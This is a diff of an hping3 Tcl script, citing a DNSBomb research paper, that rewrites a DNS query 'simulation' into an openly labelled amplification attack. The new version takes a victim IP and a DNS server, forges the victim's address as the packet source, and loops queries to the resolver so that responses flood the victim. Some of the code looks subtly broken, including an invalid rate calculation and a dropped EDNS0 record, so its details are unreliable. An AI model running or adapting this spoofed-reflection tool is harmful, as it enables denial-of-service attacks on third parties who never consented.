@@ -1,18 +1,18 @@
 #!/usr/bin/hping3 --tcl
 # https://lixiang521.com/publication/oakland24-2/sp24summer-dnsbomb-li.pdf
+
 source hpingstdlib.htcl
 
 # Ensure correct number of arguments
-if { $argc != 1 } {
-    puts "Usage: $argv0 <VICTIM_SERVER>"
+if { $argc != 2 } {
+    puts "Usage: $argv0 <VICTIM_SERVER> <DNS_SERVER>"
     exit
 }
 
-# Get the victim server from the command line argument
-set VICTIM_SERVER [lindex $argv 0]
+# Get the victim server and DNS server from the command line arguments
+set DEST_IP [lindex $argv 0]    ;# Victim server IP address
+set DNS_SERVER [lindex $argv 1] ;# Target DNS server IP address
 
-# DNS server to be used for the attack
-set DNS_SERVER "8.8.8.8"  # Public DNS server
 # Interval between sending each query in seconds
 set QUERY_INTERVAL 0.01
 # Number of queries to send
@@ -22,35 +22,55 @@ set EDNS0_SIZE 4096
 # Domain to query (large domain to ensure a large response)
 set TARGET_DOMAIN "example.com"
 
-# Function to send a DNS query
-proc send_dns_query {dst_ip src_port} {
-    global TARGET_DOMAIN EDNS0_SIZE
-
-    # DNS Header: Transaction ID (2 bytes) + Flags (2 bytes) + Questions (2 bytes) + Answer RRs (2 bytes) + Authority RRs (2 bytes) + Additional RRs (2 bytes)
-    set query [binary format H* "000001000001000000000000"]
-
-    # Question Section: QNAME (variable length, each label prefixed with its length, terminated with 00) + QTYPE (2 bytes) + QCLASS (2 bytes)
-    # Convert domain name to DNS format (e.g., "example.com" to "\7example\3com\0")
-    append query [binary format c* [split [string map {. \03} $TARGET_DOMAIN] {}]]
-    append query [binary format H* "00010001"]  ;# QTYPE=A (1) + QCLASS=IN (1)
-
-    # EDNS0 Pseudo-Record: Type (2 bytes, 0x29 for OPT) + UDP Payload Size (2 bytes) + Higher Bits in Extended RCODE and Flags (1 byte) + EDNS0 Version (1 byte) + Z (2 bytes) + Data Length (2 bytes)
-    append query [binary format H* "0029"]  ;# OPT record
-    append query [binary format H* [format "%04x" $EDNS0_SIZE]]  ;# EDNS0 UDP payload size (e.g., 4096 bytes)
-    append query [binary format H* "0000800000000000"]  ;# Extended RCODE and flags, EDNS0 version, Z, data length
-
-    # Send the UDP packet with the constructed DNS query
-    send_udp_packet $dst_ip 53 $src_port $query
+# Function to build DNS query
+proc build_dns_query {} {
+    # Transaction ID (2 bytes)
+    set txid \x12\x34
+    # Flags (2 bytes): Standard query, Recursion Desired
+    set flags \x01\x00
+    # Questions (2 bytes): 1 question
+    set qdcount \x00\x01
+    # Answer RRs (2 bytes): 0 answers
+    set ancount \x00\x00
+    # Authority RRs (2 bytes): 0 authority records
+    set nscount \x00\x00
+    # Additional RRs (2 bytes): 0 additional records
+    set arcount \x00\x00
+    # Query name: "example.com" (3 bytes for 'com', 7 bytes for 'example', 1 byte for root, 1 byte for null terminator)
+    set qname \x07example\x03com\x00
+    # Query type (2 bytes): A record (host address)
+    set qtype \x00\x01
+    # Query class (2 bytes): IN (internet)
+    set qclass \x00\x01
+    
+    # Concatenate all parts to form the full DNS query
+    return "$txid$flags$qdcount$ancount$nscount$arcount$qname$qtype$qclass"
 }
 
-puts "Starting DNSBOMB simulation against $VICTIM_SERVER..."
-
-# Step 1: Accumulate DNS Queries
-puts "Accumulating DNS queries..."
-for {set i 1} {$i <= $NUM_QUERIES} {incr i} {
-    set src_port [expr {10000 + $i}]
-    send_dns_query $DNS_SERVER $src_port
-    after [expr {$QUERY_INTERVAL * 1000}]
+# Function to build and send UDP packets using hping3's send function
+proc send_udp_packet {src_ip dest_ip dest_port data} {
+    # Building the packet with hping's internal functions
+    set probe [hping_udp_packet new]
+    $probe set ip_dst $dest_ip
+    $probe set ip_src $src_ip
+    $probe set ip_ttl 64
+    $probe set udp_dport $dest_port
+    $probe set udp_data $data
+    return $probe
 }
 
-puts "DNSBOMB simulation completed."
+# Function to perform DNS amplification attack
+proc perform_attack {victim_ip dns_server_ip} {
+    set query [build_dns_query]
+    # Calculate rate-limit values
+    set rate 1 / $::QUERY_INTERVAL  ;# Number of queries to send per second
+
+    for {set i 0} {$i < $::NUM_QUERIES} {incr i} {
+        set probe [send_udp_packet $victim_ip $dns_server_ip 53 $query]
+        hping send $probe
+        after [expr {int($::QUERY_INTERVAL * 1000)}]  ;# Wait between sends to control the rate
+    }
+}
+
+# Execute the attack
+perform_attack $DEST_IP $DNS_SERVER
